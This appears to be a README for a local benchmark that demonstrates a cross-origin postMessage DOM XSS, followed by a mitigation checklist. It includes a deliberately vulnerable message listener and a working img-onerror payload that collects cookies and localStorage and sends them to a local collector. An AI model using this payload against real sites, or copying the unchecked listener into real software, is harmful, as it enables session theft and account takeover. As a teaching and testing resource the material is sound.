# Vulnerable postMessage iframe benchmark

### Overview

This is a minimal, local testbed that demonstrates a dangerous window.postMessage usage pattern: a victim site (bank) exposes two components one sends messages, the other listens for message events and does not check event.origin. An attacker page embeds the victim in an iframe and sends a crafted message on onload. Because the victim blindly inserts event.data into the DOM via innerHTML, attacker-controlled markup/JS executes in the victim origin and can exfiltrate non-HttpOnly cookies / localStorage to an attacker collector.
This README explains the vulnerability, reproduces the PoC, lists detection and exploitation payloads, provides a mitigation checklist. Core behaviour and mitigations follow guidance from MDN, OWASP and PortSwigger.

### Critical vulnerability
Cross-origin postMessage → DOM XSS (CRITICAL)

Description
The victim page registers a message event listener and does not validate event.origin (or event.source). It assigns event.data directly to a DOM sink (element.innerHTML) without sanitization:

```javascript
window.addEventListener('message', function (event) {
  // VULNERABLE: no event.origin check, no sanitization
  document.getElementById('listenerOutput').innerHTML = event.data;
});
```

When an attacker-controlled page embeds the victim in an iframe and sends a crafted message (e.g., in iframe.onload), the attacker's HTML/JS executes in the victim origin. That script can read non-HttpOnly cookies, localStorage, and any DOM-accessible secrets, then exfiltrate them (e.g., via an Image GET). This is a DOM-based XSS triggered through web messaging and is rated Critical due to the ability to obtain session material and act as the victim user.

### Impact / Risk

Full DOM execution in victim origin → read non-HttpOnly cookies, localStorage, session storage.

Possible account takeover or session abuse if sensitive tokens are stored in accessible storage.

Silent, automatic exfiltration is possible because the attacker can send the message on iframe onload (no user interaction required).

If the victim uses innerHTML widely, attackers can chain further actions (CSRF-like requests, UI manipulation, credential capture).
Severity: Critical

### PoC (what to run)

Place these files in two separate local servers to emulate cross-origin behaviour:

bank.html — victim (serve from http://localhost:5500/bank.html)

Contains: sender component (posts to parent) and vulnerable listener (addEventListener('message', ...) that uses innerHTML with no event.origin check).

attacker.html — attacker (serve from http://localhost:5501/attacker.html)

Contains: \<iframe src="http://localhost:5500/bank.html"> and an iframe.onload handler that calls iframe.contentWindow.postMessage(payload, '*') automatically.

collector.js — simple Node/Express collector (run on http://localhost:9000) to receive exfiltrated query parameters.

Minimal example payload (attacker → victim) used in the benchmark:

```html
<img src=x onerror="
  var c=encodeURIComponent(document.cookie||'');
  var ls=encodeURIComponent(JSON.stringify((function(){
    try{var o={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);o[k]=localStorage.getItem(k);}return o;}catch(e){return 'err';}
  })()));
  new Image().src='http://localhost:9000/collect?c='+c+'&ls='+ls;
">
```

Running these three files locally reproduces the vulnerability and shows the collector receiving exfiltrated values if the victim executes the injected code.


### Mitigations & secure patterns

Apply these defensive measures in the victim code:

1. Validate event.origin: use a strict allow-list and verify event.source when necessary:
```javascript
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://trusted.example') return;
  // further validation...
});
```

Avoid wildcard '*'. OWASP strongly recommends origin validation. 
OWASP

2. Treat message data as data, not HTML: prefer textContent, value, or parameterized APIs. Avoid innerHTML.

3. Sanitize if HTML is required: use a well-maintained sanitizer (e.g., DOMPurify) before inserting HTML. Test sanitization in your CSP context. 
DOMPurify

4. Prefer structured messages: postMessage({ type: 'action', payload: {...} }, origin) and validate type and payload fields server-side or before use.

5. Cookie hardening: store session tokens in cookies with HttpOnly, Secure, and appropriate SameSite attributes to reduce JS access and cross-site leakage.

6. Use CSP & sandboxing: a restrictive Content Security Policy and iframe sandbox reduce impact of injections, especially when combined with other controls. 
cheatsheetseries.owasp.org

7. Logging & monitoring: log unexpected origins and suspicious message contents in staging to help detect misuse.
